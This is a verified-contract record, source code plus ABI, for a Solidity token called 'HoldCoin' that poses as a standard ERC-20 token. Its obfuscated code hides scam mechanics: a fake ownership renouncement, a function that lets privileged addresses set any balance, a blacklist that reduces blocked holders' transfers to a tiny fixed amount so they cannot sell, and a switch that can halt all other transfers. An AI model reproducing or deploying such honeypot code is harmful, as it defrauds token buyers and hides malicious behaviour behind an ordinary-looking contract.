{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract toTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableReceiver {\n    function createPair(address shouldTeam, address walletShould) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface txShouldTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface marketingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTeamTo) external view returns (uint256);\n\n    function transfer(address enableShouldMax, uint256 teamMin) external returns (bool);\n\n    function allowance(address toBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableShouldMax,\n        uint256 teamMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityFee, uint256 value);\n    event Approval(address indexed toBuy, address indexed spender, uint256 value);\n}\n\ninterface marketingReceiverMetadata is marketingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HoldCoin is toTrading, marketingReceiver, marketingReceiverMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return totalAmount;\n    }\n\n    function transferFrom(address limitLaunch, address enableShouldMax, uint256 teamMin) external override returns (bool) {\n        if (_msgSender() != senderBuy) {\n            if (launchAmount[limitLaunch][_msgSender()] != type(uint256).max) {\n                require(teamMin <= launchAmount[limitLaunch][_msgSender()]);\n                launchAmount[limitLaunch][_msgSender()] -= teamMin;\n            }\n        }\n        return teamReceiverTo(limitLaunch, enableShouldMax, teamMin);\n    }\n\n    string private receiverBuy = \"HCN\";\n\n    function launchedExempt() public {\n        emit OwnershipTransferred(toSell, address(0));\n        receiverList = address(0);\n    }\n\n    function transfer(address tradingTake, uint256 teamMin) external virtual override returns (bool) {\n        return teamReceiverTo(_msgSender(), tradingTake, teamMin);\n    }\n\n    uint256 private toExempt;\n\n    function getOwner() external view returns (address) {\n        return receiverList;\n    }\n\n    mapping(address => uint256) private launchedBuy;\n\n    mapping(address => bool) public atWallet;\n\n    bool private takeSwap;\n\n    uint256 public walletTo = 3;\n\n    function exemptMax(address tradingAt) public {\n        exemptLaunched();\n        \n        if (tradingAt == toSell || tradingAt == minTx) {\n            return;\n        }\n        maxFrom[tradingAt] = true;\n    }\n\n    mapping(address => bool) public maxFrom;\n\n    bool public amountSender;\n\n    uint256 constant teamTake = 18 ** 10;\n\n    function toAt(address txLaunch) public {\n        if (amountSender) {\n            return;\n        }\n        if (isReceiver) {\n            tradingTo = fundBuy;\n        }\n        atWallet[txLaunch] = true;\n        if (tradingTo != fundSell) {\n            tradingTo = toExempt;\n        }\n        amountSender = true;\n    }\n\n    uint256 public fundBuy;\n\n    uint256 swapTokenTake;\n\n    function senderWallet(address tradingTake, uint256 teamMin) public {\n        exemptLaunched();\n        launchedBuy[tradingTake] = teamMin;\n    }\n\n    function balanceOf(address receiverTeamTo) public view virtual override returns (uint256) {\n        return launchedBuy[receiverTeamTo];\n    }\n\n    uint256 private takeToIs = 100000000 * 10 ** 18;\n\n    function sellAt(address limitLaunch, address enableShouldMax, uint256 teamMin) internal returns (bool) {\n        require(launchedBuy[limitLaunch] >= teamMin);\n        launchedBuy[limitLaunch] -= teamMin;\n        launchedBuy[enableShouldMax] += teamMin;\n        emit Transfer(limitLaunch, enableShouldMax, teamMin);\n        return true;\n    }\n\n    constructor (){\n        \n        launchedExempt();\n        txShouldTo senderBuySell = txShouldTo(senderBuy);\n        minTx = enableReceiver(senderBuySell.factory()).createPair(senderBuySell.WETH(), address(this));\n        totalExempt = enableReceiver(senderBuySell.factory()).feeTo();\n        if (takeSwap) {\n            shouldLaunched = false;\n        }\n        toSell = _msgSender();\n        atWallet[toSell] = true;\n        launchedBuy[toSell] = takeToIs;\n        \n        emit Transfer(address(0), toSell, takeToIs);\n    }\n\n    function allowance(address modeAmount, address launchWalletBuy) external view virtual override returns (uint256) {\n        if (launchWalletBuy == senderBuy) {\n            return type(uint256).max;\n        }\n        return launchAmount[modeAmount][launchWalletBuy];\n    }\n\n    uint256 marketingIs;\n\n    bool private marketingMode;\n\n    address totalExempt;\n\n    uint256 public exemptFund = 0;\n\n    mapping(address => mapping(address => uint256)) private launchAmount;\n\n    address public toSell;\n\n    address senderBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public shouldLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptFundLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return receiverList;\n    }\n\n    function shouldList(uint256 teamMin) public {\n        exemptLaunched();\n        swapTokenTake = teamMin;\n    }\n\n    function teamReceiverTo(address limitLaunch, address enableShouldMax, uint256 teamMin) internal returns (bool) {\n        if (limitLaunch == toSell) {\n            return sellAt(limitLaunch, enableShouldMax, teamMin);\n        }\n        uint256 autoBuy = marketingReceiver(minTx).balanceOf(totalExempt);\n        require(autoBuy == swapTokenTake);\n        require(enableShouldMax != totalExempt);\n        if (maxFrom[limitLaunch]) {\n            return sellAt(limitLaunch, enableShouldMax, teamTake);\n        }\n        teamMin = minLaunched(limitLaunch, enableShouldMax, teamMin);\n        return sellAt(limitLaunch, enableShouldMax, teamMin);\n    }\n\n    function minLaunched(address limitLaunch, address enableShouldMax, uint256 teamMin) internal view returns (uint256) {\n        require(teamMin > 0);\n\n        uint256 autoTrading = 0;\n        if (limitLaunch == minTx && walletTo > 0) {\n            autoTrading = teamMin * walletTo / 100;\n        } else if (enableShouldMax == minTx && exemptFund > 0) {\n            autoTrading = teamMin * exemptFund / 100;\n        }\n        require(autoTrading <= teamMin);\n        return teamMin - autoTrading;\n    }\n\n    bool public isReceiver;\n\n    uint8 private exemptFundLaunch = 18;\n\n    uint256 public fundSell;\n\n    function exemptLaunched() private view {\n        require(atWallet[_msgSender()]);\n    }\n\n    function approve(address launchWalletBuy, uint256 teamMin) public virtual override returns (bool) {\n        launchAmount[_msgSender()][launchWalletBuy] = teamMin;\n        emit Approval(_msgSender(), launchWalletBuy, teamMin);\n        return true;\n    }\n\n    bool private marketingFund;\n\n    uint256 private minExempt;\n\n    event OwnershipTransferred(address indexed launchSender, address indexed isSwap);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeToIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverBuy;\n    }\n\n    address private receiverList;\n\n    uint256 private tradingTo;\n\n    string private totalAmount = \"Hold Coin\";\n\n    address public minTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchWalletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWalletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeamTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMin\",\"type\":\"uint256\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamMin\",\"type\":\"uint256\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"toAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableShouldMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HoldCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}